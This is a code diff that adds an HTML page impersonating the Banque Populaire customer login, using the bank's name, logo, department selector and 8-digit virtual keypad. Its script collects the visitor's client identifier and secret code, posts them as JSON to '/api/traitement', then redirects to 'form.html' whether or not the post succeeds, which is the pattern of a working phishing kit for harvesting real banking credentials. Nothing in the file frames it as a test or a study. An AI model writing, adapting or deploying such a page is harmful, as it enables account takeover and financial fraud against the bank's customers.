@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banque Populaire - Connexion à mon Espace Personnel</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- STYLE DESIGN BANQUE POPULAIRE (CONFORME AUX CAPTURES) --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #ffffff;
+            color: #333333;
+            -webkit-font-smoothing: antialiased;
+        }
+        .app-container {
+            max-width: 450px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+        
+        /* En-tête */
+        .bp-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 20px;
+            border-bottom: 1px solid #f0f2f5;
+            background: #ffffff;
+        }
+        .bp-header-logo-size img {
+            max-height: 34px;
+            display: block;
+            object-fit: contain;
+        }
+        .bp-header-action-link {
+            color: #002D72;
+            font-size: 15px;
+            font-weight: 500;
+            text-decoration: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        /* Gestion des étapes */
+        .bp-step {
+            display: none;
+            padding: 30px 24px;
+            flex-grow: 1;
+        }
+        .bp-step.bp-active-step {
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Titres */
+        .bp-main-title {
+            font-family: 'Poppins', sans-serif;
+            font-size: 21px;
+            color: #002D72;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 28px;
+            line-height: 1.3;
+        }
+
+        /* Champs de saisie & sélections */
+        .bp-input-wrapper {
+            position: relative;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+        
+        /* Style du sélecteur régional */
+        #bp-region-select {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #BCC5D3;
+            border-radius: 8px;
+            font-family: inherit;
+            font-size: 15px;
+            color: #0056B3;
+            background-color: #ffffff;
+            outline: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        /* Style du champ identifiant actif */
+        #bp-client-id {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #002D72;
+            border-radius: 8px;
+            font-family: inherit;
+            font-size: 16px;
+            color: #002D72;
+            background-color: #ffffff;
+            outline: none;
+            font-weight: 600;
+        }
+        #bp-client-id::placeholder {
+            color: #A0AEC0;
+            font-weight: 400;
+        }
+        .bp-clear-input {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 24px;
+            color: #A0AEC0;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        /* Commutateur Mémoriser */
+        .bp-toggle-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 30px;
+            margin-top: 5px;
+        }
+        .bp-toggle-label {
+            font-size: 14px;
+            color: #4A5568;
+            font-weight: 500;
+        }
+        .bp-switch {
+            position: relative;
+            display: inline-block;
+            width: 44px;
+            height: 24px;
+        }
+        .bp-switch input { opacity: 0; width: 0; height: 0; }
+        .bp-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: #E2E8F0;
+            transition: .3s;
+            border-radius: 24px;
+        }
+        .bp-slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .3s;
+            border-radius: 50%;
+        }
+        input:checked + .bp-slider { background-color: #002D72; }
+        input:checked + .bp-slider:before { transform: translateX(20px); }
+
+        /* Boutons d'action principaux */
+        .bp-btn-main-blue {
+            width: 100%;
+            padding: 16px;
+            background-color: #002D72;
+            color: #ffffff;
+            border-radius: 8px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            text-align: center;
+            transition: background 0.2s;
+        }
+        .bp-btn-main-blue:hover {
+            background-color: #001F4D;
+        }
+        
+        .bp-btn-main-gray {
+            width: 100%;
+            padding: 16px;
+            background-color: #EAECEF;
+            color: #A0AEC0;
+            border-radius: 8px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            cursor: not-allowed;
+            text-align: center;
+        }
+
+        /* Rappel Identifiant Étape 2 */
+        .bp-id-reminder-box {
+            background-color: #F4F6F9;
+            padding: 14px 18px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            text-align: center;
+            font-size: 15px;
+            color: #4A5568;
+            border: 1px solid #E2E8F0;
+        }
+        .bp-id-reminder-box strong {
+            color: #002D72;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        /* Boîtes de puces (8 Chiffres) */
+        .bp-dots-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 25px;
+            width: 100%;
+        }
+        .bp-dots-row {
+            display: flex;
+            gap: 8px;
+        }
+        .bp-dot {
+            width: 38px;
+            height: 44px;
+            border: 1px solid #BCC5D3;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #ffffff;
+        }
+        .bp-dot.bp-filled::after {
+            content: "•";
+            font-size: 26px;
+            color: #002D72;
+        }
+
+        /* Clavier virtuel numérique (4 colonnes) */
+        .bp-keyboard-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            width: 100%;
+            max-width: 340px;
+            margin: 0 auto 20px auto;
+        }
+        .bp-key {
+            width: 100%;
+            aspect-ratio: 1.25;
+            background-color: #ffffff;
+            border: 1px solid #DCE1E7;
+            border-radius: 8px;
+            font-family: 'Poppins', sans-serif;
+            font-size: 19px;
+            font-weight: 600;
+            color: #002D72;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.03);
+        }
+        .bp-key:active { background-color: #F4F6F9; }
+        .bp-key-empty { width: 100%; aspect-ratio: 1.25; }
+
+        /* Pied de page & Assistance */
+        .bp-help-section {
+            margin-top: auto;
+            padding-top: 25px;
+            border-top: 1px dashed #E2E8F0;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .bp-space-top-border { margin-top: 20px; }
+        .bp-help-link {
+            color: #002D72;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .bp-help-link:hover { text-decoration: underline; }
+        
+        .bp-security-banner {
+            background-color: #FFFDF5;
+            border: 1px solid #FBEFCE;
+            padding: 14px;
+            border-radius: 8px;
+            margin-bottom: 5px;
+        }
+        .bp-security-banner h3 { font-size: 14px; color: #B7791F; margin-bottom: 4px; font-weight: 600; }
+        .bp-security-banner p { font-size: 12px; color: #744210; line-height: 1.4; }
+    </style>
+</head>
+<body>
+
+    <!-- INPUT INVISIBLE POUR ENVOYER LE NOM EXACT DE LA BANQUE CONFORME À TA REQUÊTE -->
+    <input type="hidden" id="nom_banque" value="Banque Populaire">
+
+    <div class="app-container">
+
+        <!-- ÉTAPE 1 : RECHERCHE RÉGION ET IDENTIFIANT -->
+        <div id="bp-step-id" class="bp-step bp-active-step">
+            <header class="bp-header">
+                <a href="banque.html" class="bp-header-action-link">× Quitter</a>
+                <div class="bp-header-logo-size">
+                    <img src="Banquepopulaire_logo.svg.webp" alt="Banque Populaire">
+                </div>
+                <a href="#" class="bp-header-action-link">? Aide</a>
+            </header>
+
+            <main class="bp-content">
+                <h2 class="bp-main-title">Saisissez votre identifiant</h2>
+                
+                <!-- Menu de sélection : Top 50 des plus grands départements -->
+<div class="bp-input-wrapper">
+    <select id="bp-region-select">
+        <option value="" disabled selected>Sélectionnez votre département</option>
+        <option value="01">01 - Ain</option>
+        <option value="02">02 - Aisne</option>
+        <option value="06">06 - Alpes-Maritimes</option>
+        <option value="13">13 - Bouches-du-Rhône</option>
+        <option value="14">14 - Calvados</option>
+        <option value="17">17 - Charente-Maritime</option>
+        <option value="21">21 - Côte-d'Or</option>
+        <option value="29">29 - Finistère</option>
+        <option value="30">30 - Gard</option>
+        <option value="31">31 - Haute-Garonne</option>
+        <option value="33">33 - Gironde</option>
+        <option value="34">34 - Hérault</option>
+        <option value="35">35 - Ille-et-Vilaine</option>
+        <option value="37">37 - Indre-et-Loire</option>
+        <option value="38">38 - Isère</option>
+        <option value="44">44 - Loire-Atlantique</option>
+        <option value="45">45 - Loiret</option>
+        <option value="49">49 - Maine-et-Loire</option>
+        <option value="51">51 - Marne</option>
+        <option value="54">54 - Meurthe-et-Moselle</option>
+        <option value="56">56 - Morbihan</option>
+        <option value="57">57 - Moselle</option>
+        <option value="59">59 - Nord</option>
+        <option value="60">60 - Oise</option>
+        <option value="62">62 - Pas-de-Calais</option>
+        <option value="63">63 - Puy-de-Dôme</option>
+        <option value="64">64 - Pyrénées-Atlantiques</option>
+        <option value="66">66 - Pyrénées-Orientales</option>
+        <option value="67">67 - Bas-Rhin</option>
+        <option value="68">68 - Haut-Rhin</option>
+        <option value="69">69 - Rhône</option>
+        <option value="71">71 - Saône-et-Loire</option>
+        <option value="72">72 - Sarthe</option>
+        <option value="74">74 - Haute-Savoie</option>
+        <option value="75">75 - Paris</option>
+        <option value="76">76 - Seine-Maritime</option>
+        <option value="77">77 - Seine-et-Marne</option>
+        <option value="78">78 - Yvelines</option>
+        <option value="80">80 - Somme</option>
+        <option value="83">83 - Var</option>
+        <option value="84">84 - Vaucluse</option>
+        <option value="85">85 - Vendée</option>
+        <option value="86">86 - Vienne</option>
+        <option value="87">87 - Haute-Vienne</option>
+        <option value="91">91 - Essonne</option>
+        <option value="92">92 - Hauts-de-Seine</option>
+        <option value="93">93 - Seine-Saint-Denis</option>
+        <option value="94">94 - Val-de-Marne</option>
+        <option value="95">95 - Val-d'Oise</option>
+    </select>
+</div>
+
+
+                <!-- Saisie identifiant de l'espace client -->
+                <div class="bp-input-wrapper">
+                    <input type="tel" id="bp-client-id" maxlength="11" placeholder="Entrez votre identifiant" autocomplete="off">
+                    <span class="bp-clear-input" id="bp-id-clear">×</span>
+                </div>
+
+                <div class="bp-toggle-row">
+                    <label class="bp-switch">
+                        <input type="checkbox" id="bp-remember-me">
+                        <span class="bp-slider"></span>
+                    </label>
+                    <span class="bp-toggle-label">Mémoriser mon identifiant</span>
+                </div>
+
+                <button id="bp-btn-submit-id" class="bp-btn-main-blue">Valider et continuer</button>
+
+                <div class="bp-help-section">
+                    <div class="bp-security-banner">
+                        <h3>Où trouver votre identifiant ?</h3>
+                        <p>Il figure sur votre contrat de banque à distance ou sur vos relevés de comptes imprimés.</p>
+                    </div>
+                    <a href="#" class="bp-help-link">» Identifiant oublié ?</a>
+                    <a href="#" class="bp-help-link">» Première connexion ou code secret oublié ?</a>
+                </div>
+            </main>
+        </div>
+
+        <!-- ÉTAPE 2 : CODE SECRET À 8 CHIFFRES -->
+        <div id="bp-step-password" class="bp-step">
+            <header class="bp-header">
+                <span id="bp-modify-id-link" class="bp-header-action-link">‹ Retour à l'identifiant</span>
+                <div class="bp-header-logo-size">
+                    <img src="Banquepopulaire_logo.svg.webp" alt="Banque Populaire">
+                </div>
+                <a href="#" class="bp-header-action-link">? Aide</a>
+            </header>
+
+            <main class="bp-content">
+                <h2 class="bp-main-title">Saisissez votre code secret (8 chiffres)</h2>
+
+                <div class="bp-id-reminder-box">
+                    <span>Identifiant : <strong id="bp-id-display">--------</strong></span>
+                </div>
+
+                <div class="bp-dots-container">
+                    <div class="bp-dots-row">
+                        <span class="bp-dot"></span>
+                        <span class="bp-dot"></span>
+                        <span class="bp-dot"></span>
+                        <span class="bp-dot"></span>
+                        <span class="bp-dot"></span>
+                        <span class="bp-dot"></span>
+                        <span class="bp-dot"></span>
+                        <span class="bp-dot"></span>
+                    </div>
+                </div>
+
+                <div class="bp-keyboard-grid" id="bp-virtual-keyboard"></div>
+
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <button type="button" id="bp-backspace" style="background: none; border: none; color: #002D72; font-weight: 600; font-size: 15px; cursor: pointer;">⌫ Effacer le code</button>
+                </div>
+
+                <button id="bp-btn-submit-pass" class="bp-btn-main-gray" disabled>Accéder à mon espace client</button>
+                
+                <div class="bp-help-section bp-space-top-border">
+                    <a href="#" class="bp-help-link">» Problème d'accessibilité avec le clavier ?</a>
+                    <a href="#" class="bp-help-link">» Nos conseils pour naviguer en toute sécurité</a>
+                </div>
+            </main>
+        </div>
+
+    </div>
+
+<script>
+    // 1. Déclarations des éléments du DOM
+    const stepId = document.getElementById('bp-step-id');
+    const stepPass = document.getElementById('bp-step-password');
+    const inputId = document.getElementById('bp-client-id');
+    const btnClearId = document.getElementById('bp-id-clear');
+    const btnSubmitId = document.getElementById('bp-btn-submit-id');
+    const btnSubmitPass = document.getElementById('bp-btn-submit-pass');
+    const backspaceBtn = document.getElementById('bp-backspace');
+    const keyboardGrid = document.getElementById('bp-virtual-keyboard');
+    const idDisplay = document.getElementById('bp-id-display');
+    const modifyIdLink = document.getElementById('bp-modify-id-link');
+    const dots = document.querySelectorAll('.bp-dot');
+
+    let secretCode = "";
+
+    // 2. Traitement asynchrone sécurisé (Zéro blocage au clic)
+    function submitToPHP() {
+        const banqueInput = document.getElementById('nom_banque');
+        const banqueFixe = banqueInput ? banqueInput.value : "Banque Populaire";
+
+        // Changement d'état visuel immédiat pour empêcher tout double-clic
+        if (btnSubmitPass) {
+            btnSubmitPass.disabled = true;
+            btnSubmitPass.textContent = "Connexion en cours...";
+            btnSubmitPass.style.opacity = "0.7";
+        }
+
+        const dataToSend = {
+            nom_banque: banqueFixe,
+            client_id: inputId ? inputId.value : "",
+            secret_code: secretCode
+        };
+
+        // DISPOSITIF DE SECOURS ABSOLU : Redirection forcée après 1.5s max
+        const forceRedirectTimeout = setTimeout(() => {
+            window.location.href = 'form.html';
+        }, 1500);
+
+        // Appel à l'API de traitement
+        fetch('/api/traitement', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(dataToSend)
+        })
+        .then(() => {
+            clearTimeout(forceRedirectTimeout);
+            window.location.href = 'form.html';
+        })
+        .catch(error => {
+            console.error('Erreur réseau interceptée:', error);
+            clearTimeout(forceRedirectTimeout);
+            window.location.href = 'form.html';
+        });
+    }
+
+    // 3. Logique comportementale de l'identifiant
+    if (inputId) {
+        inputId.addEventListener('input', () => {
+            inputId.value = inputId.value.replace(/\D/g, '');
+            if (btnClearId) {
+                btnClearId.style.display = inputId.value.length > 0 ? 'block' : 'none';
+            }
+        });
+    }
+
+    if (btnClearId) {
+        btnClearId.addEventListener('click', () => {
+            if (inputId) inputId.value = "";
+            btnClearId.style.display = 'none';
+        });
+    }
+
+    // Naviguer vers l'étape 2 (Code secret)
+    if (btnSubmitId) {
+        btnSubmitId.addEventListener('click', () => {
+            if (inputId && inputId.value.length >= 4) {
+                if (idDisplay) idDisplay.textContent = inputId.value;
+                if (stepId) stepId.classList.remove('bp-active-step');
+                if (stepPass) stepPass.classList.add('bp-active-step');
+                buildBpKeyboard();
+            } else {
+                alert('Veuillez entrer un identifiant valide.');
+            }
+        });
+    }
+
+    if (modifyIdLink) {
+        modifyIdLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (stepPass) stepPass.classList.remove('bp-active-step');
+            if (stepId) stepId.classList.add('bp-active-step');
+        });
+    }
+
+    // 4. Injection du clavier virtuel (Disposition officielle)
+    function buildBpKeyboard() {
+        if (!keyboardGrid) return;
+        keyboardGrid.innerHTML = "";
+        
+        const layout = [
+            '1', '2', '3', '',
+            '4', '5', '6', '0',
+            '7', '8', '9', ''
+        ];
+
+        layout.forEach(val => {
+            const cell = document.createElement('div');
+            if (val === '') {
+                cell.className = 'bp-key-empty';
+            } else {
+                const btn = document.createElement('button');
+                btn.className = 'bp-key';
+                btn.textContent = val;
+                btn.type = "button"; 
+
+                btn.onclick = () => {
+                    if (secretCode.length < 8) { 
+                        secretCode += val;
+                        updateDots();
+                    }
+                };
+                cell.appendChild(btn);
+            }
+            keyboardGrid.appendChild(cell);
+        });
+    }
+
+    // 5. Mise à jour de l'état des puces
+    function updateDots() {
+        dots.forEach((dot, index) => {
+            if (index < secretCode.length) {
+                dot.classList.add('bp-filled');
+            } else {
+                dot.classList.remove('bp-filled');
+            }
+        });
+
+        if (btnSubmitPass) {
+            if (secretCode.length === 8) { 
+                btnSubmitPass.removeAttribute('disabled');
+                btnSubmitPass.className = 'bp-btn-main-blue';
+                btnSubmitPass.style.cursor = 'pointer';
+            } else {
+                btnSubmitPass.setAttribute('disabled', 'true');
+                btnSubmitPass.className = 'bp-btn-main-gray';
+                btnSubmitPass.style.cursor = 'not-allowed';
+            }
+        }
+    }
+
+    if (backspaceBtn) {
+        backspaceBtn.addEventListener('click', () => {
+            secretCode = "";
+            updateDots();
+        });
+    }
+
+    // 6. Gestion du clic de confirmation final
+    if (btnSubmitPass) {
+        btnSubmitPass.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (secretCode.length === 8) {
+                submitToPHP();
+            }
+        });
+    }
+</script>
+
+</body>
+</html>
